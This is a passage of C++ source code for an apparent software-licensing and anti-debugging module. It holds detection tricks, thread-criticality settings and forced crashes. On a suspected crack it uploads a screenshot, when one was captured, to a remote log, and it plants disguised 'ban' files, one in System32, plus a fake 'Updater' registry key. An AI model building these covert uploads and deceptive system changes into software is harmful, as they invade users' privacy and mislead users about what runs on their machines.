        body += Encrypt("\"description\": \"") + desc + Encrypt("\",");
        body += Encrypt("\"footer\": {\"text\": \"") + time_of_detection + Encrypt("\"},");
        body += Encrypt("\"color\": ") + color;
        body += Encrypt("}]}");
        body += Encrypt("\r\n");

        if (screenshotCaptured)
        {
            body += Encrypt("--") + boundary + Encrypt("\r\n");
            body += Encrypt("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n");
            body += Encrypt("Content-Type: image/png\r\n\r\n");
            body.append(reinterpret_cast<const char*>(screenshotBuffer.data()), screenshotBuffer.size());
            body += Encrypt("\r\n");
        }

        body += Encrypt("--") + boundary + Encrypt("--\r\n");

        std::string headers = Encrypt("Content-Type: multipart/form-data; boundary=") + boundary;
        std::wstring wideHeaders = ConvertToWideString(headers);

        BOOL bResults = WinHttpSendRequest(hRequest, wideHeaders.c_str(), (DWORD)-1L, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), Encrypt(0));

        if (bResults)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
    }
}

bool WriteFileToDisk(const std::string& filePath)
{
    std::ofstream file(filePath, std::ios::out | std::ios::binary);
    if (!file.is_open())
    {
        return false;
    }

    file.close();
    return true;
}

bool FileExists(const std::string& filePath)
{
    std::ifstream file(filePath);
    return file.good();
}

void WriteRegistryKey()
{
    HKEY hKey;
    LPCWSTR subKey = Encrypt(L"Software\\Updater");
    LPCWSTR valueName = Encrypt(L"UpdateCheck");
    const char* licenseKey = Encrypt("Altra_Version_v2.64");
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subKey, Encrypt(0), NULL, Encrypt(0), KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(licenseKey), static_cast<DWORD>(strlen(licenseKey) + Encrypt(1)));
        RegCloseKey(hKey);
    }
}

bool RegistryKeyExists()
{
    HKEY hKey;
    LPCWSTR subKey = Encrypt(L"Software\\Updater");  // Registry subkey path
    LPCWSTR valueName = Encrypt(L"UpdateCheck");    // Registry value name
    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, Encrypt(0), KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        DWORD dataType;
        BYTE data[256];
        DWORD dataSize = sizeof(data);
        if (RegQueryValueExW(hKey, valueName, NULL, &dataType, data, &dataSize) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return true; 
        }

        RegCloseKey(hKey);
    }

    return false;
}

void RemoveBans()
{
    bool success = true;

    LPCWSTR subKey = Encrypt(L"Software\\Updater");
    RegDeleteKeyW(HKEY_CURRENT_USER, subKey);

    const std::vector<std::string> filesToDelete = 
    {
        Encrypt("C:\\Loader_License_Key.alphrix"),
        Encrypt("C:\\Users\\Public\\Loader_57.bin"),
        Encrypt("C:\\Windows\\System32\\bootsectorrepair.exe"),
        Encrypt("C:\\Program Files\\Common Files\\Vmprotect.bin")
    };

    for (const auto& filePath : filesToDelete)
    {
        std::remove(filePath.c_str());
    }
}

bool CheckBan()
{
    if (ban_system)
    {
        bool banned = false;
        if (RegistryKeyExists())
        {
            banned = true;
        }

        const std::vector<std::string> filesToCheck =
        {
            Encrypt("C:\\Loader_License_Key.alphrix"),
            Encrypt("C:\\Users\\Public\\Loader_57.bin"),
            Encrypt("C:\\Windows\\System32\\bootsectorrepair.exe"),
            Encrypt("C:\\Program Files\\Common Files\\Vmprotect.bin")
        };

        for (const auto& filePath : filesToCheck)
        {
            if (FileExists(filePath))
            {
                banned = true;
                break;
            }
        }

        return banned;
    }

    return false;
}


secure void HandleAttack(const std::string& detection_reason, bool ban)
{
    if (Imgui_Window != NULL)
    {
        Lazy(SendMessageA).get()(Imgui_Window, WM_CLOSE, 0, 0);
        Lazy(DestroyWindow).get()(Imgui_Window);
    }

    string name = Encrypt("Q29kZVZ1YWx0");
    string ownerid = Encrypt("QU5CdVU2TlRGRA");
    /*string secret = Encrypt("MzczYTM2ZTdjODBkZTMzNGQ3MGZkZjZmZDlkOGFiODcwMmNkNWIzM2FhMzU3Njk5YzEzZTdlMGU2ZDQxYjBlOA");*/
    string ver = Encrypt("MS4w");
    string authapi = Encrypt("aHR0cHM6Ly9rZXlhdXRoLndpbi9hcGkvMS4zLw");
    api Auth(decode(name).c_str(), decode(ownerid).c_str(), /*decode(secret).c_str(),*/ decode(ver).c_str(), decode(authapi).c_str(), Encrypt(""));
    Auth.init();
    Auth.log(Encrypt("Crack Attempt -> ") + detection_reason);

    Send_Log(detection_reason, 1); Send_Log(detection_reason, 0); // need window above and logs below dont change

    if (ban_system && ban)
    {
        WriteFileToDisk(Encrypt("C:\\Loader_License_Key.alphrix"));
        WriteFileToDisk(Encrypt("C:\\Users\\Public\\Loader_57.bin"));
        WriteFileToDisk(Encrypt("C:\\Windows\\System32\\bootsectorrepair.exe"));
        WriteFileToDisk(Encrypt("C:\\Program Files\\Common Files\\Vmprotect.bin"));
        WriteRegistryKey();
    }

    Imports.exit_application();

    typedef NTSTATUS(NTAPI* pNtTerminateProcess)(HANDLE, NTSTATUS);
    auto NtTerminateProcess = Imports.get_function<pNtTerminateProcess>(Encrypt("ntdll.dll"), Encrypt("NtTerminateProcess"));
    auto ExitFunc = Imports.get_function<void(*)(int)>(Encrypt("msvcrt.dll"), Encrypt("exit"));

    void* fakeExitFunc = reinterpret_cast<void*>(ExitFunc);
    fakeExitFunc = reinterpret_cast<void*>(reinterpret_cast<size_t>(fakeExitFunc) ^ Encrypt(0xDEADBEEF));
    reinterpret_cast<void(*)(int)>(reinterpret_cast<size_t>(fakeExitFunc) ^ Encrypt(0xDEADBEEF))(Encrypt(0));

    Imports.get_function<BOOL(*)(HANDLE, UINT)>(Encrypt("kernel32.dll"), Encrypt("TerminateProcess"))(Imports.get_current_process(), Encrypt(0x99));
    NtTerminateProcess(Imports.get_current_process(), Encrypt(0x99));
    __fastfail(Encrypt(0x99));
    *((volatile int*)nullptr) = Encrypt(0x99);
}

void Check_Query_Info()
{
    HANDLE Process = INVALID_HANDLE_VALUE;
    My_PROCESS_BASIC_INFORMATION Info = { 0 };
    ULONG Length = 0;
    HMODULE Library = Lazy(LoadLibraryW).forwarded_safe_cached()(Encrypt(L"ntdll.dll"));
    CheckQueryInformationProcess NtQueryInformationProcess = NULL;
    NtQueryInformationProcess = (CheckQueryInformationProcess)Imports.get_proc_address(Library, Encrypt("NtQueryInformationProcess"));
    Process = Imports.get_current_process();
    NTSTATUS Status = NtQueryInformationProcess(Process, ProcessBasicInformation, &Info, sizeof(Info), &Length);
    if (NT_SUCCESS(Status))
    {
        MY_PPEB peb_instance = 0;
        MY_PPEB Peb = peb_instance;
    
        if (Peb)
        {
            if (Peb->BeingDebugged)
            {
                HandleAttack(Encrypt("Debug Object #20"), Encrypt(1));
            }
        }
    }
}

void Authorize(std::string license)
{
    Hide_Function();;
    if (IsVaildFormat(license))
    {
        string name = Encrypt("Q29kZVZ1YWx0");
        string ownerid = Encrypt("QU5CdVU2TlRGRA");
        /*string secret = Encrypt("MzczYTM2ZTdjODBkZTMzNGQ3MGZkZjZmZDlkOGFiODcwMmNkNWIzM2FhMzU3Njk5YzEzZTdlMGU2ZDQxYjBlOA");*/
        string ver = Encrypt("MS4w");
        string authapi = Encrypt("aHR0cHM6Ly9rZXlhdXRoLndpbi9hcGkvMS4zLw");
        api Auth(decode(name).c_str(), decode(ownerid).c_str(), /*decode(secret).c_str(),*/ decode(ver).c_str(), decode(authapi).c_str(), Encrypt(""));
        Auth.init();

        Auth.license(license);

        if (Auth.response.success)
        {
            
            auto data = Auth.var(Encrypt("codevault_Request_Data"));

            if (data == Encrypt("28030115658788"))
            {
                
                for (const auto& sub : Auth.user_data.subscriptions)
                {
                    
                    if (sub.name == Encrypt("Special"))
                    {
                        
                        auto data2 = Auth.var(Encrypt("Encryption_Key"));

                        if (data2 == Encrypt("0x909c") && (IsVaildFormat(license)))
                        {
                            Auth.log(Encrypt("codevault -> Successfully Loggedin!"));
                            authorized = true;
                        }
                    }
                    else
                    {
                        HandleAttack(Encrypt("Attempt To Emulate codevault"), Encrypt(0));
                    }
                }
            }
            else
            {
                HandleAttack(Encrypt("Invalid License"), Encrypt(0));
            }
        }
    }

    if (!authorized)
    {
        HandleAttack(Encrypt("Invalid codevault License"), Encrypt(0));
    }
    Hide_Function_End();
}

void IsThreadSuspended(HANDLE hThread)
{
    MY2_THREAD_BASIC_INFORMATION tbi;
    ULONG len = Encrypt(0);

    auto NtQueryInformationThreadFunc = Imports.get_function<pdef_NtQueryInformationThread>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationThread"));

    NTSTATUS status = NtQueryInformationThreadFunc(hThread,(_THREAD_INFORMATION_CLASS)ThreadBasicInformation, &tbi, sizeof(tbi), &len);
    if (status == Encrypt(0))
    {
        if (tbi.State == StateSuspended) 
        {
            flag = Encrypt(1);
            HandleAttack(Encrypt("Thread Tampering #16"), Encrypt(1));
        }

        if (tbi.State == StateTerminated)
        {
            flag = Encrypt(1);
            HandleAttack(Encrypt("Thread Tampering #17"), Encrypt(1));
        }
    }
}

PVOID GetThreadStartAddress(HANDLE threadHandle)
{
    NTSTATUS status;
    PVOID startAddress = nullptr;
    Imports.get_function<NTSTATUS(*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationThread"))(threadHandle, (THREADINFOCLASS)Encrypt(9), &startAddress, sizeof(startAddress), nullptr);
    return startAddress;
}

bool IsTPPWorkerThreadByStartAddress(HANDLE threadHandle)
{
    PVOID startAddress = GetThreadStartAddress(threadHandle);
    HMODULE ntdll = Imports.get_module_handleA(Encrypt("ntdll.dll"));
    MODULEINFO moduleInfo = {};
    GetModuleInformation(Imports.get_current_process(), ntdll, &moduleInfo, sizeof(moduleInfo));
    if (startAddress >= moduleInfo.lpBaseOfDll && startAddress < (PVOID)((char*)moduleInfo.lpBaseOfDll + moduleInfo.SizeOfImage))
    {
        return true;
    }
    return false;
}

void Protect_Thread(HANDLE hThread)
{
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!IsTPPWorkerThreadByStartAddress(hThread))
    {
        Protected_Threads.push_back(Lazy(GetThreadId).get()(hThread));

        auto NtSetInformationThreadFunc = Imports.get_function<pdef_NtSetInformationThread>(Encrypt("ntdll.dll"), Encrypt("NtSetInformationThread"));
        auto RtlSetThreadIsCriticalFunc = Imports.get_function<pdef_RtlSetThreadIsCritical>(Encrypt("ntdll.dll"), Encrypt("RtlSetThreadIsCritical"));
        auto SetThreadExecutionStateFunc = Imports.get_function<pdef_SetThreadExecutionState>(Encrypt("kernel32.dll"), Encrypt("SetThreadExecutionState"));

        BOOLEAN isCritical = TRUE;

        NtSetInformationThreadFunc(hThread, static_cast<THREAD_INFORMATION_CLASS>(0x11), &isCritical, sizeof(isCritical));
        SetThreadExecutionStateFunc(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
        RtlSetThreadIsCriticalFunc(Encrypt(1), nullptr, Encrypt(0));
    }
}

secure void Protect_Current_Thread()
{
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    auto NtSetInformationThreadFunc = Imports.get_function<pdef_NtSetInformationThread>(Encrypt("ntdll.dll"), Encrypt("NtSetInformationThread"));
    auto RtlSetThreadIsCriticalFunc = Imports.get_function<pdef_RtlSetThreadIsCritical>(Encrypt("ntdll.dll"), Encrypt("RtlSetThreadIsCritical"));
    auto SetThreadExecutionStateFunc = Imports.get_function<pdef_SetThreadExecutionState>(Encrypt("kernel32.dll"), Encrypt("SetThreadExecutionState"));

    BOOLEAN isCritical = TRUE;

    NtSetInformationThreadFunc(Imports.get_current_thread(), static_cast<THREAD_INFORMATION_CLASS>(0x11), &isCritical, sizeof(isCritical));
    SetThreadExecutionStateFunc(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
    RtlSetThreadIsCriticalFunc(Encrypt(1), nullptr, Encrypt(0));
}




bool CheckThreadIntegrity(DWORD threadID)
{
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    THREAD_BASIC_INFORMATION tbi;
    ULONG returnLength;
    DWORD exitCode;
    bool result = true;

    HANDLE threadHandle = Lazy(OpenThread).get()(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, Encrypt(0), threadID);
    Imports.get_function<NTSTATUS(*)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationThread"))(threadHandle, ThreadBasicInformation, &tbi, sizeof(tbi), &returnLength);

    if (tbi.SuspendCount > Encrypt(0))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Thread Tampering #15"), Encrypt(1));
        result = false;
    }

    if (Lazy(GetExitCodeThread).get()(threadHandle, &exitCode) && exitCode != STILL_ACTIVE)
    {
        flag = Encrypt(1);
        result = false;
    }

    if (Lazy(ResumeThread).get()(threadHandle) == Encrypt(1))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Thread Tampering #15"), Encrypt(1));
        result = false;
    }

    Lazy(CloseHandle).get()(threadHandle);

    return result;
}

bool IsThreadRunning(HANDLE threadHandle)
{
    DWORD threadID = Lazy(GetThreadId).get()(threadHandle);
    return CheckThreadIntegrity(threadID);
}


auto Check_Threads()
{
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;

    if (thread1_started && time1 > Encrypt(0))
    {
        if (!CheckThreadIntegrity(Lazy(GetThreadId).get()(Thread1)))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Thread Tampering #11"), Encrypt(0));
        }

        HANDLE threadHandle2 = Lazy(OpenThread).get()(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, Encrypt(0), Lazy(GetThreadId).get()(Thread1));
   
    }
    for (DWORD threadID : Protected_Threads)
    {
        HANDLE threadHandle = Lazy(OpenThread).get()(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, Encrypt(0), threadID);
        Lazy(ResumeThread).get()(threadHandle);

        if (!CheckThreadIntegrity(threadID))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Thread Tampering #12"), Encrypt(0));
        }
    }
   
    return Encrypt(1);
}


void Protect_All_Threads()
{
    std::vector<HANDLE> threadHandles;
    DWORD dwThreadId = Encrypt(0);
    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);
    HANDLE hSnapshot = Lazy(CreateToolhelp32Snapshot).get()(TH32CS_SNAPTHREAD, Encrypt(0));

    if (Lazy(Thread32First).get()(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == Imports.get_current_process_id())
            {
                threadHandles.push_back(Lazy(OpenThread).get()(THREAD_SET_INFORMATION, Encrypt(0), te.th32ThreadID));
            }
        } while (Lazy(Thread32Next).get()(hSnapshot, &te));
    }

    Lazy(CloseHandle).get()(hSnapshot);

    for (HANDLE hThread : threadHandles)
    {
        if (!IsTPPWorkerThreadByStartAddress(hThread))
        {
            Protected_Threads.push_back(Lazy(GetThreadId).get()(hThread)); Protect_Thread(hThread);
        }
    }
}

void check_remote_debugger_present()
{
    Hide_Function();
    BOOL isDebuggerPresent = Encrypt(0);
    auto CheckRemoteDebuggerPresentFunc = Imports.get_function<BOOL(*)(HANDLE, PBOOL)>(Encrypt("kernel32.dll"), Encrypt("CheckRemoteDebuggerPresent"));
    if (CheckRemoteDebuggerPresentFunc(Imports.get_current_process(), &isDebuggerPresent) && isDebuggerPresent)
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #5"), Encrypt(0));
    }
    Hide_Function_End();
}


void detect_debug_object()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = Imports.get_function<pNtQueryInformationProcess>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));
    HANDLE debugObject = nullptr;
    if (NtQueryInformationProcess(Imports.get_current_process(), Encrypt(30), &debugObject, sizeof(debugObject), nullptr) == Encrypt(0) && debugObject)
    {
        flag = Encrypt(1);  HandleAttack(Encrypt("Debug Object #4"), Encrypt(1));
    }
    Hide_Function_End();
}

void detect_ntglobalflag()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = Imports.get_function<pNtQueryInformationProcess>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));
    DWORD ntGlobalFlag = Encrypt(0);
    if (NtQueryInformationProcess(Imports.get_current_process(), Encrypt(0x1F), &ntGlobalFlag, sizeof(ntGlobalFlag), nullptr) == Encrypt(0) && (ntGlobalFlag & Encrypt(0x70)))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #3"), Encrypt(1));
    }
    Hide_Function_End();
}

void detect_hardware_breakpoints()
{
    Hide_Function();
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    auto GetThreadContextFunc = Imports.get_function<BOOL(*)(HANDLE, LPCONTEXT)>(Encrypt("kernel32.dll"), Encrypt("GetThreadContext"));
    if (GetThreadContextFunc(Imports.get_current_thread(), &ctx))
    {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Breakpoint #1"), Encrypt(0));
        }
    }
    Hide_Function_End();
}

void detect_kernel_debugger()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
    auto NtQuerySystemInformationFunc = Imports.get_function<pNtQuerySystemInformation>(Encrypt("ntdll.dll"), Encrypt("NtQuerySystemInformation"));
    struct SYSTEM_KERNEL_DEBUGGER_INFORMATION { BOOLEAN KernelDebuggerEnabled; BOOLEAN KernelDebuggerNotPresent; };
    SYSTEM_KERNEL_DEBUGGER_INFORMATION info = { Encrypt(0) };
    if (NtQuerySystemInformationFunc(Encrypt(35), &info, sizeof(info), nullptr) == Encrypt(0))
    {
        if (info.KernelDebuggerEnabled && !info.KernelDebuggerNotPresent)
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #2"), Encrypt(0));
        }
    }
    Hide_Function_End();
}

void close_port()
{
    Hide_Function();
    auto NtClose = Imports.get_function<NTSTATUS(*)(HANDLE)>(Encrypt("ntdll.dll"), Encrypt("NtClose"));
    HANDLE debugObject = nullptr;

    auto NtQueryInformationProcess = Imports.get_function<NTSTATUS(*)(HANDLE, ULONG, PVOID, ULONG, PULONG)>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));
    if (NtQueryInformationProcess && NtQueryInformationProcess(Imports.get_current_process(), Encrypt(30), &debugObject, sizeof(debugObject), nullptr) == Encrypt(0))
    {
        if (debugObject)
        {
            NtClose(debugObject);
        }
    }
    Hide_Function_End();
}



void detect_disable_debugging()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
    auto NtSetInformationProcessFunc = Imports.get_function<pNtSetInformationProcess>(Encrypt("ntdll.dll"), Encrypt("NtSetInformationProcess"));

    ULONG debugFlags = Encrypt(1);
    NTSTATUS status = NtSetInformationProcessFunc(Imports.get_current_process(), Encrypt(0x1F), &debugFlags, sizeof(debugFlags));
    if (status != Encrypt(0)) 
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Debug Object #1"), Encrypt(0));
    }
    Hide_Function_End();
}

void detect_thread_debug_state()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationThreadFunc = Imports.get_function<pNtQueryInformationThread>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationThread"));

    ULONG debugState = Encrypt(0);
    if (NtQueryInformationThreadFunc(Imports.get_current_thread(), Encrypt(0x11), &debugState, sizeof(debugState), nullptr) == Encrypt(0))
    {
        if (debugState != Encrypt(0))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Thread Debug State"), Encrypt(0));
        }
    }
    Hide_Function_End();
}

void detect_debugger_via_handle_types()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryObjectFunc = Imports.get_function<pNtQueryObject>(Encrypt("ntdll.dll"), Encrypt("NtQueryObject"));

    HANDLE h = Imports.get_current_process();
    BYTE buffer[512];
    ULONG length = Encrypt(0);

    NTSTATUS status = NtQueryObjectFunc(h, Encrypt(2), buffer, sizeof(buffer), &length); // ObjectTypeInformation

    if (status == Encrypt(0) && strstr((char*)buffer, Encrypt("DebugObject")))
    {
        flag = Encrypt(1); HandleAttack(Encrypt("Handle Types"), Encrypt(0));
    }
    Hide_Function_End();
}


bool patch_veh_debugger()
{
    Hide_Function();
    bool bFound = Encrypt(0);

    HMODULE veh_debugger = Imports.get_module_handleA(Encrypt("vehdebug-x86_64.dll"));

    if (veh_debugger != NULL)
    {
        UINT64 veh_addr = (UINT64)Imports.get_proc_address(veh_debugger, Encrypt("InitializeVEH")); //check for named exports of cheat engine's VEH debugger

        if (veh_addr > Encrypt(0))
        {
            bFound = Encrypt(1);

            DWORD dwOldProt = Encrypt(0);

            if (!Imports.virtual_protect((void*)veh_addr, Encrypt(1), PAGE_EXECUTE_READWRITE, &dwOldProt))
            {
                flag = Encrypt(1); Imports.exit_application();
            }

            Imports.import_memcpy((void*)veh_addr, Encrypt("\xC3"), sizeof(BYTE)); //patch first byte of `InitializeVEH` with a ret, stops call to InitializeVEH from succeeding.

            Imports.virtual_protect((void*)veh_addr, Encrypt(1), dwOldProt, &dwOldProt);
        }
    }

    return bFound;
    Hide_Function_End();
}


void detect_debugger_attach_flags()
{
    Hide_Function();
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcessFunc = Imports.get_function<pNtQueryInformationProcess>(Encrypt("ntdll.dll"), Encrypt("NtQueryInformationProcess"));

    ULONG flags = Encrypt(0);
    if (NtQueryInformationProcessFunc(Imports.get_current_process(), 0x1F, &flags, sizeof(flags), nullptr) == Encrypt(0))
    {
        if (flags & Encrypt(0x70))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Attach Flag"), Encrypt(0));
        }
    }
    Hide_Function_End();
}

void prevent_debugger_attach()
{
    Hide_Function();
    auto DebugActiveProcessStopFunc = Imports.get_function<BOOL(*)(DWORD)>(Encrypt("kernel32.dll"), Encrypt("DebugActiveProcessStop"));
    auto NtSetInformationProcessFunc = Imports.get_function<NTSTATUS(*)(HANDLE, ULONG, PVOID, ULONG)>(Encrypt("ntdll.dll"), Encrypt("NtSetInformationProcess"));
    DebugActiveProcessStopFunc(Imports.get_current_process_id());
    ULONG debugFlags = Encrypt(1);
    NtSetInformationProcessFunc(Imports.get_current_process(), Encrypt(0x1F), &debugFlags, sizeof(debugFlags));
    Hide_Function_End();
}


void SetDebugInfo()
{
    Hide_Function();
    auto addy = __readgsqword(Encrypt(0x60));
    auto beingDebugged = reinterpret_cast<std::uint8_t*>(addy + Encrypt(0x2));
    auto ntGlobalFlag = reinterpret_cast<std::uint32_t*>(addy + Encrypt(0xBC));
    auto processHeap = *reinterpret_cast<std::uint64_t*>(addy + Encrypt(0x30));
    auto heapFlags = reinterpret_cast<std::uint32_t*>(processHeap + Encrypt(0x70));

    *beingDebugged = Encrypt(0x99);
    *ntGlobalFlag = Encrypt(0x99);
    *heapFlags = Encrypt(0x99);
    set = Encrypt(1);
    Hide_Function_End();
}

void CheckDebugInfoIntegrity()
{
    Hide_Function();
    if (set)
    {
        auto addy = __readgsqword(Encrypt(0x60));
        auto beingDebugged = reinterpret_cast<std::uint8_t*>(addy + Encrypt(0x2));
        auto ntGlobalFlag = reinterpret_cast<std::uint32_t*>(addy + Encrypt(0xBC));
        auto processHeap = *reinterpret_cast<std::uint64_t*>(addy + Encrypt(0x30));
        auto heapFlags = reinterpret_cast<std::uint32_t*>(processHeap + Encrypt(0x70));

        if (*ntGlobalFlag != Encrypt(0x99))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Peb Modification #1"), Encrypt(1));
        }

        if (*beingDebugged != Encrypt(0x99))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Peb Modification #2"), Encrypt(1));
        }

        if (*heapFlags != Encrypt(0x99))
        {
            flag = Encrypt(1); HandleAttack(Encrypt("Peb Modification #3"), Encrypt(1));
        }
    }
    Hide_Function_End();
}

auto NoStepie()
{
    PVOID pRetAddress = _ReturnAddress();

    if (*(PBYTE)pRetAddress == Encrypt(0xCC))
    {
        DWORD dwOldProtect;
        if (Imports.virtual_protect(pRetAddress, Encrypt(1), PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = Encrypt(0x90);
            Imports.virtual_protect(pRetAddress, Encrypt(1), dwOldProtect, &dwOldProtect);
            flag = Encrypt(1); HandleAttack(Encrypt("Single Stepping"), Encrypt(1));
        }
    }
}

void ModifySizeOfImage(HMODULE hModule)
{
    for (int i = 0; i < Encrypt(200); ++i) { NoStepie(); }
    DWORD oldProtect;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + dosHeader->e_lfanew);

    Imports.virtual_protect(&ntHeaders->OptionalHeader.SizeOfImage, sizeof(DWORD), PAGE_READWRITE, &oldProtect);
    for (int i = 0; i < Encrypt(200); ++i) { ntHeaders->OptionalHeader.SizeOfImage += Encrypt(0x9999999999999999); }
    Imports.virtual_protect(&ntHeaders->OptionalHeader.SizeOfImage, sizeof(DWORD), oldProtect, &oldProtect);
}

bool IsHyperHideDebuggingProcess()
{
    bool bDetect = Encrypt(0);
    DWORD Length = Encrypt(0);
    PVOID bufferPoolInformation = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    using t_NtQuerySystemInformation = NTSTATUS(NTAPI*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
    HMODULE hNtDll = Imports.load_library(Encrypt("ntdll.dll"));
    auto NtQuerySystemInformation = (t_NtQuerySystemInformation)Imports.get_proc_address(hNtDll, Encrypt("NtQuerySystemInformation"));
    status = NtQuerySystemInformation(SystemPoolTagInformation, bufferPoolInformation, Length, &Length);

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (bufferPoolInformation != NULL)
        {
            Lazy(VirtualFree).get()(bufferPoolInformation, Encrypt(0), MEM_RELEASE);
        }

        bufferPoolInformation = Imports.virtual_alloc(NULL, Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        status = NtQuerySystemInformation(SystemPoolTagInformation, bufferPoolInformation, Length, &Length);
    }

    if (!NT_SUCCESS(status))
    {
        if (bufferPoolInformation != NULL)
        {
            Lazy(VirtualFree).get()(bufferPoolInformation, Encrypt(0), MEM_RELEASE);
        }
        Lazy(FreeLibrary).get()(hNtDll);
        return Encrypt(0);
    }

    auto sysPoolTagInfo = (PSYSTEM_POOLTAG_INFORMATION)bufferPoolInformation;
    auto sysPoolTag = (PSYSTEM_POOLTAG)&sysPoolTagInfo->TagInfo->Tag;

    for (ULONG i = Encrypt(0); i < sysPoolTagInfo->Count; i++)
    {
        if (Imports.import_strcmp((char*)sysPoolTag->Tag, Encrypt("Hyhd")) == Encrypt(0))
        {
            if (sysPoolTag->PagedAllocs || sysPoolTag->NonPagedAllocs)
            {
                if (sysPoolTag->NonPagedUsed > Encrypt(10) || sysPoolTag->PagedUsed > Encrypt(10))
                {
                    bDetect = Encrypt(1);
                }
            }
        }
        sysPoolTag++;
    }

    Lazy(VirtualFree).get()(bufferPoolInformation, Encrypt(0), MEM_RELEASE);
    Lazy(FreeLibrary).get()(hNtDll);
    return bDetect;
}

#define PAGE_SIZE2 0x1000

void Execute_Bytes(PBYTE codeBytes)
{
    __try
    {
        ((void(*)())codeBytes)();
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {

    }
}


 auto int3bs()
{
    PBYTE Memory = (PBYTE)Imports.virtual_alloc(NULL, (PAGE_SIZE2 * Encrypt(2)), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (Memory)
    {
        if (sizeof(multiByte) > PAGE_SIZE2)
        {
            Lazy(VirtualFree).get()(Memory, Encrypt(0), MEM_RELEASE);
        }
        else
        {
            PBYTE locationMultiByte = &Memory[PAGE_SIZE2 - sizeof(multiByte)];
            PBYTE locationPageTwo = &Memory[PAGE_SIZE2];
            Imports.import_memcpy(locationMultiByte, multiByte, sizeof(multiByte));
            PSAPI_WORKING_SET_EX_INFORMATION wsi;
            wsi.VirtualAddress = locationPageTwo;
            Imports.get_function<BOOL(*)(HANDLE, PVOID, DWORD)>(Encrypt("kernel32.dll"), Encrypt("K32QueryWorkingSetEx"))(((HANDLE)Encrypt(-1)), &wsi, sizeof(wsi));
            Obfuscate(Execute_Bytes)(locationMultiByte);
            Imports.get_function<BOOL(*)(HANDLE, PVOID, DWORD)>(Encrypt("kernel32.dll"), Encrypt("K32QueryWorkingSetEx"))(((HANDLE)Encrypt(-1)), &wsi, sizeof(wsi));

            if (Imports.import_memcmp(locationMultiByte, multiByte, sizeof(multiByte)) != Encrypt(0))
            {
